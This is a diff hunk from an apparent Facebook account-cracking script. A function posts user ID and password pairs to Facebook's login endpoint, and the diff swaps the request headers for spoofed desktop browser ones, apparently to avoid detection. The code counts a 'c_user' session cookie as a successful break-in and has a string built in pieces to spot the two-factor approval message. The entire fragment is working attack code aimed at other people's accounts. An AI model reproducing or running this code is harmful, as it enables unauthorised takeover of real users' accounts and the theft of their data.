@@ -1699,15 +1699,31 @@ def d(uid,pwx,tl):
             "a": "",
             "user": 0,}
             headers = {
-            "Accept-Encoding": "gzip, deflate",
-            "User-Agent": "FBAN/FB4A; FBAV/177.0.0.9.120; FBPN/com.facebook.katana; FBLC/bn_IN; FBBV/6456614; FBCR/Jio; FBMF/redmi; FBBD/redmi; FBDV/Redmi Note 14; FBSV/11; FBCA/arm64-v8a:null; FBDM/density=2.0, width=1080, height=2400; FB_FW/1",
-            "Host": "x.prod.facebook.com",
-            "Connection": "keep-alive",
-            "Accept-Language": "en-IN, en-GB;q=0.9, en-US;q=0.8, en;q=0.7",
-            "Accept": "text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7",
-            "Cache-Control": "max-age=0",}
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
+            'origin': 'https://www.facebook.com',
+            'pragma': 'no-cache',
+            'priority': 'u=0, i',
+            'referer': 'https://www.facebook.com/?ref=homescreenpwa',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
+            'viewport-width': '1440',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100'
+            url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTg4ODQ3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
             po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
